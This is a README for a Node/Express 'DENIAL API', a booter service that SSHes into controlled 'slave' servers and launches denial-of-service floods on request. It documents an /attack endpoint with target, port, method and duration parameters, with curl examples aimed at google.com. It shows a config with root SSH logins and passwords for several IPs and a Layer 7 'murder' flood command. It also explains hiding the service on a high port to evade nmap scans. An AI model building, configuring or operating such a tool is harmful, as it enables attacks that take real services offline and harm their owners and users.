# DENIAL API
A simple, customizable and dynamic EXPRESS application for distributed denial of services using ssh.
This is not made with malicious intent and I will not take any responsibility for its' usage.
## API Documentation
Path : `/attack`
Method : `GET`
| Parameters    | Are                | Required  |
| ------------- |:------------------:| ---------:|
| target        | Address destination| Yes       |
| port          | Port destination   | No        |
| method        | Methods            | Yes       |
| duration      | Time duration      | No        |
| key           | Authentication key | Yes       |

For example `GET /attack?target=google.com&port=80&method=murder&duration=60&key=TOKEN_KEY1`
cURL example : 
```
	curl -X GET \
	  -H "Content-type: application/json" \
	  -H "Accept: application/json" \
	  -d '{"target":"google.com", \
	  "port" : 80, \
	  "method" : "murder", \
	  "duration" : 60, \
	  "key" : "TOKEN_KEY1"}' \
	  "http://your_hostname:25649/attack"
```
## Setup
Simply copy & paste the files and install the dependencies with 
```
npm install
```
Make sure your main machine (where the node app is hosted at) is able to SSH connect.
Make sure your slave machine is able to accept SSH connections and got `screen` installed including the file `stopdos.sh` which is necessary to stop ongoing screen sessions without duplication.
Now run the API with the following command : 
``` node index.js```
If you want it to run in the background, the simpliest and most straightforward way is to use pm2 :
```
	sudo npm i -g pm2
	pm2 start index.js
```
## Configuration
Jump to config.json and everything from there will be pretty clear.
- "servers" is an array that holds the machines credentials necessary to ssh.
- "methods" is basically the name & command shell that will be executed when the node app connects to the servers.
- "token_keys" is an array of keys used to authenticate when triggering the API.

### Servers
The API application uses ssh to connect and execute the commands instructed therefore it needs the corresponding crendetials which are : 
```
	host/ip,
	user,
	password
```
For now the application does not support ssh keys and I do not have any plans to add that.
For example, let's say my server's credentials are : 
```
	host : 98.105.166.113
	user : root
	password : ~~S@R)-Yy>.n3nC
```
Simply go to config.json and ==>
```JSON
	"servers" : [
		{
			"host" : "98.105.166.113",
			"user" : "root",
			"password" : "~~S@R)-Yy>.n3nC"
		}
	],
```
If I want to add multiple servers ==> 
```JSON
	"servers" : [
		{
			"host" : "98.105.166.113",
			"user" : "root",
			"password" : "~~S@R)-Yy>.n3nC"
		},
		{
			"host" : "119.248.66.225",
			"user" : "johnny",
			"password" : "Nny(;2ES5<}f!F-"
		},
		{
			"host" : "77.143.152.241",
			"user" : "root",
			"password" : "z;;F:_gHT_7aV8~7"
		},
	],
```
And that's it, the node application will ssh connect to 98.105.166.113, 119.248.66.225 and 77.143.152.241 and execute the methods' shell instructed.
### Methods
"Methods" consist of two parts which are :
```
	name : Which is used in QUERY GET PARAM "method",
	command: Which is the ssh shell that will be executed
```
Methods parameters are : 
```
	%1target1% : Corresponds to QUERY GET PARAM "target",
	%1port1% : Corresponds to QUERY GET PARAM "port",
	%1duration1% : Corresponds to QUERY GET PARAM "duration"
```
For example, if the request is `GET /attack?target=google.com&port=80&duration=30`
The key words `%1target1%`, `%1port1%` and `%1duration1%` will change to `google.com`, `80` and `30` respectively.
Now let's say (for example), I want to use the Layer 7 method `Murder` included in this github repository.
I will just upload the files to my slave machine, go to config.json and change the following =>
```JSON
	"methods" : [
		{
			"name" : "murder",
			"command" : "node index.js http://%1target1%:%1port1%/ %1duration1%"
		}
	],
```
So if my request is `GET /attack?target=google.com&port=80&duration=30&method=murder`
My slave machine will run `node index.js http://google.com:80/ 30` as a shell inside the screen env.
### Token Keys
Token keys are pretty simple, they are used for authentication.
If your token key (GET QUERY PARAM `key`) is not in config.json, you will won't be able to use the API.
As simple as it gets.
One Token Key : 
```JSON
	"token_keys" : [
		"TOKEN_KEY1"
	]
```
Multiple Token Keys : 
```JSON
	"token_keys" : [
		"TOKEN_KEY1",
		"TOKEN_KEY2",
		"TOKEN_KEY3",
		"TOKEN_KEY4",
		"TOKEN_KEY5",
		"TOKEN_KEY6"
	]
```
`GET /attack?key=TOKEN_KEY1` will allow you to use the API.
`GET /attack?key=LGJDLGDHOJDSFHMLDSFHJH` will reject the request.
## FAQ 
1. Why use port 25649 as the default?
Simply to hide from scanners such as nmap (obviously unless they specificy all ports) since nmap's default scan's port range is 0-10k
2. Why did you make `/` shows `page.html`
I don't know.
3. Is there some kind of logging?
Yes, every single request gets logged. 
IP, parameters and return results including occurring errors.
4. Why use `lodash` in `./handler/check.js`?
I don't know, I pasted a solution from stackoverflow and it used lodash